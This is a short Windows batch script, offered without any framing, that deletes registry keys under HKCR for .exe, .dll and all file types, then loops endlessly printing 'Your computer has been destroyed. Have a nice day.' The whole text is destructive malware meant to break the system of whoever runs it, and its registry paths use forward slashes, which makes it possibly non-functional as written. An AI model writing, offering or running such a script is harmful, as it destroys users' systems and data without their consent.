Delete key and registry files:




@ECHO OFF
START reg delete HKCR/.exe
START reg delete HKCR/.dll
START reg delete HKCR/*
:MESSAGE
ECHO Your computer has been destroyed. Have a nice day.
GOTO MESSAGE